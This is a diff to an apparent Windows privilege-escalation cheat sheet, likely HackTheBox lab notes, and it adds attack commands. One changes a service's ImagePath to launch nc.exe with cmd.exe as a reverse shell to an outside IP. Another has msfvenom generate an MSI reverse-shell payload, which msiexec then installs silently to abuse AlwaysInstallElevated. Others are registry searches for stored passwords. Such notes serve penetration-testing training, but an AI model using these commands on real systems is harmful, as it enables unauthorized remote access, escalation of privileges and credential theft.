@@ -834,9 +834,15 @@ C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\
 
 --Changing ImagePath with PowerShell
 
-Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\{ServiceName} -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\{ServiceName} -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+
+- OR in cmd.exe
+
+C:\tools> reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
+
 
 ```
+
 
 ### Modifiable Registry Autorun Binary
 
@@ -982,6 +988,26 @@ PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%
 - AlwaysInstallElevated 
 
 C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+
+-- Generating msi payload
+
+$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
+
+
+- Executing in cmd.exe
+
+C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
+```
+
+```
+--Finding credentials in registry
+
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+REG QUERY HKLM /F "password" /t REG_SZ /S /d
+REG QUERY HKCU /F "password" /t REG_SZ /S /d
+
 ```
 
 # Linux 
